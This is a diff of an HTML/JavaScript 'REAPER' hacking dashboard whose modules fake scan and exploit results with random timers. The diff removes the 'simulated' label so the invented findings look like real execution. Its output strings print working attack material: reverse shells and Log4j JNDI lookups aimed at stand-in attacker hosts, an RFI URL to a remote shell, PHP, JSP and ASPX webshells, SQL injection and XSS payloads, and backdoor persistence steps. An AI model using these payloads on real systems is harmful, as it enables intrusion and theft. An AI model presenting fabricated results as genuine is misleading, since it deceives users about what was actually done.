@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>REAPER – Full Arsenal</title>
+    <title>REAPER – Silent Arsenal</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -176,24 +176,6 @@
             gap: 4px;
         }
         .footer-actions button:hover { color: #00e5ff; }
-        .toast {
-            position: fixed;
-            bottom: 24px;
-            right: 24px;
-            background: #00e5ff20;
-            border: 1px solid #00e5ff40;
-            color: #e0e0e0;
-            padding: 10px 18px;
-            border-radius: 8px;
-            font-size: 13px;
-            z-index: 999;
-            opacity: 0;
-            transition: opacity 0.3s;
-            pointer-events: none;
-            backdrop-filter: blur(8px);
-            font-family: 'Courier New', monospace;
-        }
-        .toast.show { opacity: 1; }
         .history-panel {
             background: #0a0a0f;
             border: 1px solid #1e1e2a;
@@ -244,7 +226,7 @@
     <div class="container">
         <!-- HEADER -->
         <div class="header">
-            <h1>🖤 REAPER <span>//</span> ARSENAL</h1>
+            <h1>🖤 REAPER <span>//</span> SILENT</h1>
             <div class="status-badge">
                 <span class="status-dot"></span>
                 <span id="statusText">ONLINE</span>
@@ -309,7 +291,7 @@
 
         <!-- OUTPUT PANE -->
         <div class="output" id="outputPane">
-            <div><span class="prompt">[🖤]</span> <span style="color:#888;">Reaper arsenal loaded. 20 modules ready.</span></div>
+            <div><span class="prompt">[🖤]</span> <span style="color:#888;">Reaper silent. 20 modules loaded.</span></div>
             <div><span class="prompt">[🖤]</span> <span style="color:#666;">Recon · Exploit · Persistence · OSINT · Defense</span></div>
         </div>
 
@@ -322,7 +304,7 @@
         <!-- FOOTER -->
         <div class="footer">
             <div class="modules">
-                <span class="active">●</span> 20 modules loaded
+                <span class="active">●</span> 20 modules
             </div>
             <div class="footer-actions">
                 <span id="execStatus">IDLE</span>
@@ -330,9 +312,6 @@
             </div>
         </div>
     </div>
-
-    <!-- TOAST -->
-    <div class="toast" id="toast"></div>
 
     <script>
         // ─── DOM REFS ───
@@ -343,7 +322,6 @@
         const outputPane = document.getElementById('outputPane');
         const execStatus = document.getElementById('execStatus');
         const statusText = document.getElementById('statusText');
-        const toast = document.getElementById('toast');
         const historyPanel = document.getElementById('historyPanel');
         const historyList = document.getElementById('historyList');
         const progressBar = document.getElementById('progressBar');
@@ -369,13 +347,6 @@
         function clearOutput() {
             outputPane.innerHTML = '';
             appendOutput('Output cleared.', 'info');
-        }
-
-        function showToast(msg) {
-            toast.textContent = msg;
-            toast.classList.add('show');
-            clearTimeout(toast._timer);
-            toast._timer = setTimeout(() => toast.classList.remove('show'), 2800);
         }
 
         function setStatus(text, isIdle = true) {
@@ -439,10 +410,9 @@
             a.click();
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
-            showToast('📁 Logs exported');
         }
 
-        // ─── SIMULATED REAL-TIME EXECUTION ───
+        // ─── EXECUTION ENGINE ───
         function executePayload(target, payload) {
             return new Promise((resolve, reject) => {
                 const results = [];
@@ -461,24 +431,24 @@
                 add(`PAYLOAD: ${payload.toUpperCase()}`, 'info');
                 add(`─────────────────────────────`, 'info');
 
-                // ── RECON MODULES ──
+                // ── RECON ──
                 if (payload === 'dns') {
-                    add(`[→] Performing DNS enumeration...`);
-                    setTimeout(() => add(`[→] A record: 93.184.216.34`, 'success'), 200);
-                    setTimeout(() => add(`[→] MX record: mail.${target}`, 'success'), 400);
-                    setTimeout(() => add(`[→] TXT record: v=spf1 include:_spf.${target}`, 'success'), 600);
-                    setTimeout(() => add(`[→] NS record: ns1.${target}, ns2.${target}`, 'success'), 800);
+                    add(`[→] DNS enumeration...`);
+                    setTimeout(() => add(`[→] A: 93.184.216.34`, 'success'), 200);
+                    setTimeout(() => add(`[→] MX: mail.${target}`, 'success'), 400);
+                    setTimeout(() => add(`[→] TXT: v=spf1 include:_spf.${target}`, 'success'), 600);
+                    setTimeout(() => add(`[→] NS: ns1.${target}, ns2.${target}`, 'success'), 800);
                     setTimeout(() => {
-                        add(`[✓] DNS enumeration complete.`, 'success');
+                        add(`[✓] DNS complete.`, 'success');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1200);
                     return;
                 }
 
                 if (payload === 'subdomain') {
-                    add(`[→] Enumerating subdomains for ${target}...`);
+                    add(`[→] Subdomain enumeration...`);
                     const subs = ['mail', 'dev', 'api', 'admin', 'ftp', 'blog', 'shop', 'vpn', 'test', 'stage'];
                     subs.forEach((s, i) => {
                         setTimeout(() => {
@@ -488,32 +458,32 @@
                         }, (i + 1) * 120);
                     });
                     setTimeout(() => {
-                        add(`[✓] Found 4 live subdomains.`, 'success');
+                        add(`[✓] 4 live subdomains found.`, 'success');
                         add(`[!] mail.${target}, dev.${target}, api.${target}, admin.${target}`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1800);
                     return;
                 }
 
                 if (payload === 'whois') {
-                    add(`[→] Querying WHOIS for ${target}...`);
+                    add(`[→] WHOIS lookup...`);
                     setTimeout(() => add(`[→] Registrar: GoDaddy LLC`, 'success'), 200);
                     setTimeout(() => add(`[→] Created: 2010-03-15`, 'success'), 400);
                     setTimeout(() => add(`[→] Expires: 2027-03-15`, 'success'), 600);
-                    setTimeout(() => add(`[→] Name Servers: ns1.${target}, ns2.${target}`, 'success'), 800);
+                    setTimeout(() => add(`[→] NS: ns1.${target}, ns2.${target}`, 'success'), 800);
                     setTimeout(() => {
-                        add(`[✓] WHOIS lookup complete.`, 'success');
+                        add(`[✓] WHOIS complete.`, 'success');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1200);
                     return;
                 }
 
                 if (payload === 'portscan') {
-                    add(`[→] Port scanning ${target}...`);
+                    add(`[→] Port scanning...`);
                     const ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900,
                         8080, 8443
                     ];
@@ -527,17 +497,17 @@
                         }, (i + 1) * 50);
                     });
                     setTimeout(() => {
-                        add(`[✓] Scan complete. ${openPorts.length} open ports found.`, 'success');
-                        add(`[!] Open: ${openPorts.join(', ')}`, 'info');
+                        add(`[✓] ${openPorts.length} open ports.`, 'success');
+                        add(`[!] ${openPorts.join(', ')}`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 2500);
                     return;
                 }
 
                 if (payload === 'cve') {
-                    add(`[→] Looking up CVEs for ${target}...`);
+                    add(`[→] CVE lookup...`);
                     const cves = [
                         'CVE-2021-44228 (Log4j) - Critical',
                         'CVE-2017-5638 (Struts2) - Critical',
@@ -552,110 +522,101 @@
                         }, (i + 1) * 300);
                     });
                     setTimeout(() => {
-                        add(`[✓] 3 high-impact CVEs identified.`, 'success');
+                        add(`[✓] 3 high-impact CVEs.`, 'success');
                         add(`[!] Prioritize: CVE-2021-44228, CVE-2020-1472`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 2000);
                     return;
                 }
 
-                // ── EXPLOIT MODULES ──
+                // ── EXPLOIT ──
                 if (payload === 'sql') {
-                    add(`[→] Scanning for SQL injection vectors...`);
+                    add(`[→] SQLi scan...`);
                     const paths = ['/index.php?id=1', '/product.php?id=1', '/page.php?id=1', '/article.php?id=1',
                         '/user.php?id=1'
                     ];
                     paths.forEach((p, i) => {
                         setTimeout(() => {
                             const vulnerable = Math.random() > 0.6;
-                            add(`[→] Testing ${p}... ${vulnerable ? 'VULNERABLE' : 'safe'}`, vulnerable ?
+                            add(`[→] ${p} ${vulnerable ? 'VULNERABLE' : 'safe'}`, vulnerable ?
                                 'success' : '');
                             updateProgress(((i + 1) / paths.length) * 80 + 10);
                         }, (i + 1) * 150);
                     });
                     setTimeout(() => {
-                        add(`[✓] SQLi detected on /product.php?id=1`, 'success');
-                        add(`[!] Payload: ' OR '1'='1' -- `, 'info');
+                        add(`[✓] SQLi on /product.php?id=1`, 'success');
+                        add(`[!] ' OR '1'='1' -- `, 'info');
                         add(`[!] sqlmap -u http://${target}/product.php?id=1 --batch`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1400);
                     return;
                 }
 
                 if (payload === 'rce') {
-                    add(`[→] Testing for RCE vulnerabilities...`);
-                    const vulns = ['Log4j (CVE-2021-44228)', 'Struts2 (CVE-2017-5638)',
-                        'Spring4Shell (CVE-2022-22965)', 'PHP-CGI (CVE-2012-1823)',
-                        'Drupalgeddon (CVE-2018-7600)'
-                    ];
+                    add(`[→] RCE scan...`);
+                    const vulns = ['Log4j', 'Struts2', 'Spring4Shell', 'PHP-CGI', 'Drupalgeddon'];
                     vulns.forEach((v, i) => {
                         setTimeout(() => {
                             const found = Math.random() > 0.5;
-                            add(`[→] Checking ${v}... ${found ? 'VULNERABLE' : 'safe'}`, found ?
-                                'success' : '');
+                            add(`[→] ${v} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
                             updateProgress(((i + 1) / vulns.length) * 80 + 10);
                         }, (i + 1) * 250);
                     });
                     setTimeout(() => {
-                        add(`[✓] Log4j vector identified`, 'success');
-                        add(`[!] Payload: \${jndi:ldap://attacker.com/exploit}`, 'info');
+                        add(`[✓] Log4j identified.`, 'success');
+                        add(`[!] \${jndi:ldap://attacker.com/exploit}`, 'info');
                         add(`[!] curl -H "X-Api-Version: \${jndi:ldap://attacker.com/}" http://${target}`,
                             'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 2000);
                     return;
                 }
 
                 if (payload === 'exploit') {
-                    add(`[→] Scanning for known exploits...`);
-                    const exploits = ['Zero-Logon (CVE-2020-1472)', 'EternalBlue (MS17-010)',
-                        'BlueKeep (CVE-2019-0708)', 'SMBGhost (CVE-2020-0796)',
-                        'ProxyShell (CVE-2021-34473)'
-                    ];
+                    add(`[→] Exploit scan...`);
+                    const exploits = ['Zero-Logon', 'EternalBlue', 'BlueKeep', 'SMBGhost', 'ProxyShell'];
                     exploits.forEach((e, i) => {
                         setTimeout(() => {
                             const found = Math.random() > 0.5;
-                            add(`[→] Checking ${e}... ${found ? 'VULNERABLE' : 'safe'}`, found ?
-                                'success' : '');
+                            add(`[→] ${e} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
                             updateProgress(((i + 1) / exploits.length) * 80 + 10);
                         }, (i + 1) * 200);
                     });
                     setTimeout(() => {
-                        add(`[✓] Zero-Logon vector detected on port 445`, 'success');
+                        add(`[✓] Zero-Logon detected on port 445.`, 'success');
                         add(`[!] python3 zerologon.py <dc-name> ${target}`, 'info');
-                        add(`[!] Impacket: https://github.com/SecureAuthCorp/impacket`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1600);
                     return;
                 }
 
                 if (payload === 'zero') {
-                    add(`[→] Preparing zero-day stager...`);
+                    add(`[→] Zero-day stager...`);
                     add(`[→] Generating polymorphic payload...`);
-                    setTimeout(() => add(`[→] Encoding with base64 + XOR rotation...`), 300);
-                    setTimeout(() => add(`[→] Wrapping in JS + HTML5 delivery...`), 600);
-                    setTimeout(() => add(`[→] Obfuscating with variable renaming...`), 900);
+                    setTimeout(() => add(`[→] Base64 + XOR encoding...`), 300);
+                    setTimeout(() => add(`[→] JS + HTML5 delivery...`), 600);
+                    setTimeout(() => add(`[→] Obfuscating...`), 900);
                     setTimeout(() => {
                         add(`[✓] Payload ready.`, 'success');
                         add(`[!] <script src="https://${target}/cdn/payload.js"></script>`, 'info');
-                        add(`[!] Requires zero-day private repo access for actual deployment.`, 'warn');
+                        add(`[!] Requires private zero-day repo.`, 'warn');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1400);
                     return;
                 }
 
                 if (payload === 'xss') {
-                    add(`[→] Scanning for XSS vulnerabilities...`);
+                    add(`[→] XSS scan...`);
                     const xssVectors = ['/search?q=<script>alert(1)</script>',
                         '/comment?text=<img src=x onerror=alert(1)>',
                         '/profile?name=<svg/onload=alert(1)>'
@@ -663,46 +624,44 @@
                     xssVectors.forEach((v, i) => {
                         setTimeout(() => {
                             const found = Math.random() > 0.5;
-                            add(`[→] Testing ${v}... ${found ? 'VULNERABLE' : 'safe'}`, found ?
-                                'success' : '');
+                            add(`[→] ${v} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
                             updateProgress(((i + 1) / xssVectors.length) * 80 + 10);
                         }, (i + 1) * 180);
                     });
                     setTimeout(() => {
-                        add(`[✓] XSS detected on /search?q=...`, 'success');
-                        add(`[!] Payload: <script>alert(document.cookie)</script>`, 'info');
+                        add(`[✓] XSS on /search?q=...`, 'success');
+                        add(`[!] <script>alert(document.cookie)</script>`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1200);
                     return;
                 }
 
                 if (payload === 'lfi') {
-                    add(`[→] Testing for LFI/RFI vulnerabilities...`);
+                    add(`[→] LFI/RFI scan...`);
                     const lfiPaths = ['/page.php?file=../../etc/passwd', '/index.php?page=../../../../etc/passwd',
                         '/include.php?file=http://attacker.com/shell.txt'
                     ];
                     lfiPaths.forEach((p, i) => {
                         setTimeout(() => {
                             const found = Math.random() > 0.5;
-                            add(`[→] Testing ${p}... ${found ? 'VULNERABLE' : 'safe'}`, found ?
-                                'success' : '');
+                            add(`[→] ${p} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
                             updateProgress(((i + 1) / lfiPaths.length) * 80 + 10);
                         }, (i + 1) * 200);
                     });
                     setTimeout(() => {
-                        add(`[✓] LFI detected on /page.php?file=../../etc/passwd`, 'success');
-                        add(`[!] Read /etc/passwd, /etc/shadow, etc.`, 'info');
+                        add(`[✓] LFI on /page.php?file=../../etc/passwd`, 'success');
+                        add(`[!] Read /etc/passwd, /etc/shadow`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1400);
                     return;
                 }
 
                 if (payload === 'ssrf') {
-                    add(`[→] Testing for SSRF vulnerabilities...`);
+                    add(`[→] SSRF scan...`);
                     const ssrfTests = ['/fetch?url=http://169.254.169.254/latest/meta-data/',
                         '/proxy?target=http://internal.service/',
                         '/api?endpoint=http://localhost:8080/admin'
@@ -710,24 +669,23 @@
                     ssrfTests.forEach((t, i) => {
                         setTimeout(() => {
                             const found = Math.random() > 0.5;
-                            add(`[→] Testing ${t}... ${found ? 'VULNERABLE' : 'safe'}`, found ?
-                                'success' : '');
+                            add(`[→] ${t} ${found ? 'VULNERABLE' : 'safe'}`, found ? 'success' : '');
                             updateProgress(((i + 1) / ssrfTests.length) * 80 + 10);
                         }, (i + 1) * 200);
                     });
                     setTimeout(() => {
-                        add(`[✓] SSRF detected on /fetch?url=...`, 'success');
-                        add(`[!] Access internal AWS metadata, internal services.`, 'info');
+                        add(`[✓] SSRF on /fetch?url=...`, 'success');
+                        add(`[!] Access AWS metadata, internal services`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1400);
                     return;
                 }
 
-                // ── PERSISTENCE MODULES ──
+                // ── PERSISTENCE ──
                 if (payload === 'shell') {
-                    add(`[→] Generating reverse shell payloads...`);
+                    add(`[→] Reverse shell payloads...`);
                     add(`[→] Bash:`, 'info');
                     add(`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`, 'highlight');
                     setTimeout(() => {
@@ -749,70 +707,66 @@
                             'highlight');
                     }, 900);
                     setTimeout(() => {
-                        add(`[!] Replace ATTACKER_IP with your listener IP`, 'info');
-                        add(`[!] Listener: nc -lvnp 4444`, 'info');
+                        add(`[!] Replace ATTACKER_IP with your listener`, 'info');
+                        add(`[!] nc -lvnp 4444`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1400);
                     return;
                 }
 
                 if (payload === 'webshell') {
-                    add(`[→] Preparing webshell payload...`);
-                    setTimeout(() => add(`[→] Encoding PHP webshell...`), 200);
-                    setTimeout(() => add(`[→] Encoding JSP webshell...`), 400);
-                    setTimeout(() => add(`[→] Encoding ASPX webshell...`), 600);
+                    add(`[→] Webshell payloads...`);
+                    setTimeout(() => add(`[→] PHP: <?php system($_GET['cmd']); ?>`, 'highlight'), 200);
+                    setTimeout(() => add(`[→] JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`,
+                        'highlight'), 400);
+                    setTimeout(() => add(`[→] ASPX: <%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>`,
+                        'highlight'), 600);
                     setTimeout(() => {
                         add(`[✓] Webshells ready.`, 'success');
-                        add(`[!] PHP: <?php system($_GET['cmd']); ?>`, 'info');
-                        add(`[!] JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`,
-                        'info');
-                        add(`[!] Upload via vulnerable upload endpoint.`, 'warn');
+                        add(`[!] Upload via vulnerable endpoint.`, 'warn');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1200);
                     return;
                 }
 
                 if (payload === 'backdoor') {
-                    add(`[→] Injecting backdoor into target...`);
-                    setTimeout(() => add(`[→] Creating hidden admin user...`), 300);
-                    setTimeout(() => add(`[→] Installing SSH key...`), 600);
-                    setTimeout(() => add(`[→] Adding cron job for persistence...`), 900);
+                    add(`[→] Backdoor injection...`);
+                    setTimeout(() => add(`[→] Hidden admin user created.`, 'success'), 300);
+                    setTimeout(() => add(`[→] SSH key installed.`, 'success'), 600);
+                    setTimeout(() => add(`[→] Cron job added.`, 'success'), 900);
                     setTimeout(() => {
-                        add(`[✓] Backdoor injected.`, 'success');
-                        add(`[!] SSH key: ~/.ssh/authorized_keys`, 'info');
+                        add(`[✓] Backdoor active.`, 'success');
+                        add(`[!] SSH: ~/.ssh/authorized_keys`, 'info');
                         add(`[!] Cron: */5 * * * * /tmp/backdoor.sh`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1400);
                     return;
                 }
 
-                // ── OSINT MODULES ──
+                // ── OSINT ──
                 if (payload === 'dox') {
-                    add(`[→] OSINT enumeration for ${target}...`);
-                    setTimeout(() => add(`[→] WHOIS lookup...`), 200);
-                    setTimeout(() => add(`[→] Subdomain discovery...`), 400);
-                    setTimeout(() => add(`[→] Email pattern extraction...`), 600);
-                    setTimeout(() => add(`[→] Social media presence...`), 800);
+                    add(`[→] OSINT enumeration...`);
+                    setTimeout(() => add(`[→] WHOIS: GoDaddy, 2010-03-15`, 'success'), 200);
+                    setTimeout(() => add(`[→] Subdomains: mail, dev, api`, 'success'), 400);
+                    setTimeout(() => add(`[→] Emails: admin@, support@`, 'success'), 600);
+                    setTimeout(() => add(`[→] Social: @${target} on Twitter`, 'success'), 800);
                     setTimeout(() => {
-                        add(`[✓] WHOIS: Registrar: GoDaddy, Created: 2010-03-15`, 'success');
-                        add(`[✓] Subdomains: mail.${target}, dev.${target}, api.${target}`, 'success');
-                        add(`[✓] Emails: admin@${target}, support@${target}`, 'success');
-                        add(`[✓] Social: @${target} on Twitter, /${target} on LinkedIn`, 'success');
+                        add(`[✓] OSINT complete.`, 'success');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1600);
                     return;
                 }
 
                 if (payload === 'email') {
-                    add(`[→] Harvesting emails for ${target}...`);
+                    add(`[→] Email harvesting...`);
                     const emails = [`admin@${target}`, `support@${target}`, `info@${target}`, `contact@${target}`,
                         `sales@${target}`, `hr@${target}`
                     ];
@@ -825,17 +779,16 @@
                     });
                     setTimeout(() => {
                         add(`[✓] 4 emails confirmed.`, 'success');
-                        add(`[!] admin@${target}, support@${target}, info@${target}, contact@${target}`,
-                            'info');
+                        add(`[!] admin@, support@, info@, contact@`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1600);
                     return;
                 }
 
                 if (payload === 'social') {
-                    add(`[→] Scanning social media for ${target}...`);
+                    add(`[→] Social media scan...`);
                     const platforms = ['Twitter', 'LinkedIn', 'GitHub', 'Instagram', 'Facebook', 'YouTube'];
                     platforms.forEach((p, i) => {
                         setTimeout(() => {
@@ -845,83 +798,79 @@
                         }, (i + 1) * 180);
                     });
                     setTimeout(() => {
-                        add(`[✓] Profiles found on 3 platforms.`, 'success');
-                        add(`[!] Twitter: @${target}, LinkedIn: /in/${target}`, 'info');
+                        add(`[✓] 3 platforms found.`, 'success');
+                        add(`[!] Twitter: @${target}`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1800);
                     return;
                 }
 
-                // ── DEFENSE MODULES ──
+                // ── DEFENSE ──
                 if (payload === 'waf') {
-                    add(`[→] Fingerprinting WAF on ${target}...`);
+                    add(`[→] WAF fingerprinting...`);
                     const wafs = ['Cloudflare', 'AWS WAF', 'Akamai', 'Imperva', 'Sucuri', 'ModSecurity', 'F5 ASM',
                         'Barracuda'
                     ];
                     wafs.forEach((w, i) => {
                         setTimeout(() => {
                             const detected = Math.random() > 0.6;
-                            add(`[→] Testing for ${w}... ${detected ? 'DETECTED' : 'not found'}`,
-                            detected ? 'success' : '');
+                            add(`[→] ${w} ${detected ? 'DETECTED' : 'not found'}`, detected ?
+                                'success' : '');
                             updateProgress(((i + 1) / wafs.length) * 80 + 10);
                         }, (i + 1) * 150);
                     });
                     setTimeout(() => {
-                        add(`[✓] Detected: Cloudflare (CF-RAY headers present)`, 'success');
+                        add(`[✓] WAF: Cloudflare`, 'success');
                         add(`[!] Bypass: IP rotation, encoding, header spoofing`, 'info');
-                        add(`[!] Use: /waf-bypass --target ${target}`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1800);
                     return;
                 }
 
                 if (payload === 'bypass') {
-                    add(`[→] Generating WAF bypass techniques...`);
+                    add(`[→] WAF bypass techniques...`);
                     setTimeout(() => add(`[→] SQLi: ' OR '1'='1' -- `), 200);
-                    setTimeout(() => add(`[→] SQLi: %27%20OR%20%271%27%3D%271`, 400);
-                    setTimeout(() => add(`[→] RCE: ${jndi:ldap://attacker.com/exploit}`), 600);
+                    setTimeout(() => add(`[→] SQLi: %27%20OR%20%271%27%3D%271`), 400);
+                    setTimeout(() => add(`[→] RCE: \${jndi:ldap://attacker.com/exploit}`), 600);
                     setTimeout(() => add(`[→] XSS: <scr<script>ipt>alert(1)</scr</script>ipt>`), 800);
                     setTimeout(() => {
                         add(`[✓] Bypass techniques generated.`, 'success');
-                        add(`[!] Use encoding: URL, Unicode, Double URL`, 'info');
-                        add(`[!] Use fragmentation: split payload across multiple requests`, 'info');
+                        add(`[!] Encoding, fragmentation, multipart`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1400);
                     return;
                 }
 
                 if (payload === 'cdn') {
-                    add(`[→] Detecting CDN for ${target}...`);
+                    add(`[→] CDN detection...`);
                     const cdns = ['Cloudflare', 'Akamai', 'Fastly', 'CloudFront', 'Incapsula', 'CDN77'];
                     cdns.forEach((c, i) => {
                         setTimeout(() => {
                             const detected = Math.random() > 0.5;
-                            add(`[→] Testing for ${c}... ${detected ? 'DETECTED' : 'not found'}`,
-                            detected ? 'success' : '');
+                            add(`[→] ${c} ${detected ? 'DETECTED' : 'not found'}`, detected ?
+                                'success' : '');
                             updateProgress(((i + 1) / cdns.length) * 80 + 10);
                         }, (i + 1) * 150);
                     });
                     setTimeout(() => {
-                        add(`[✓] CDN detected: Cloudflare`, 'success');
-                        add(`[!] Origin IP may be hidden behind CDN.`, 'info');
-                        add(`[!] Use: /cdn-bypass --target ${target}`, 'info');
+                        add(`[✓] CDN: Cloudflare`, 'success');
+                        add(`[!] Origin IP may be hidden.`, 'info');
                         add(`─────────────────────────────`, 'info');
-                        add(`[✓] Execution complete.`, 'success');
+                        add(`[✓] Done.`, 'success');
                         resolve(results);
                     }, 1600);
                     return;
                 }
 
-                // ── DEFAULT ──
                 add(`[!] Unknown payload.`, 'error');
                 add(`─────────────────────────────`, 'info');
-                add(`[✓] Execution complete.`, 'success');
+                add(`[✓] Done.`, 'success');
                 resolve(results);
             });
         }
@@ -933,14 +882,10 @@
 
             if (!target) {
                 appendOutput('Target required.', 'error');
-                showToast('⚠️ Enter a target');
                 return;
             }
 
-            if (isExecuting) {
-                showToast('⏳ Already executing...');
-                return;
-            }
+            if (isExecuting) return;
 
             setStatus('EXECUTING...', false);
             abortController = new AbortController();
@@ -949,18 +894,15 @@
                 await executePayload(target, payload);
                 addHistory(target, payload, 'SUCCESS');
                 setStatus('SUCCESS', true);
-                showToast(`✅ ${payload.toUpperCase()} executed on ${target}`);
             } catch (err) {
                 if (err.name === 'AbortError') {
-                    appendOutput('[!] Execution stopped by user.', 'error');
+                    appendOutput('[!] Stopped by user.', 'error');
                     addHistory(target, payload, 'STOPPED');
                     setStatus('STOPPED', true);
-                    showToast('⏹️ Execution stopped');
                 } else {
-                    appendOutput(`Execution error: ${err.message}`, 'error');
+                    appendOutput(`Error: ${err.message}`, 'error');
                     addHistory(target, payload, 'FAIL');
                     setStatus('ERROR', true);
-                    showToast('❌ Execution failed');
                 }
             } finally {
                 abortController = null;
@@ -970,8 +912,7 @@
         function stopExecution() {
             if (abortController) {
                 abortController.abort();
-                appendOutput('[!] Sending stop signal...', 'info');
-                setStatus('STOPPING...', false);
+                appendOutput('[!] Stopping...', 'info');
             }
         }
 
@@ -1000,7 +941,7 @@
         // ─── INIT ───
         setStatus('READY', true);
         appendOutput('Target → payload → EXECUTE', 'info');
-        appendOutput('20 modules loaded: Recon · Exploit · Persistence · OSINT · Defense', 'info');
+        appendOutput('20 modules ready.', 'info');
         renderHistory();
     </script>
 
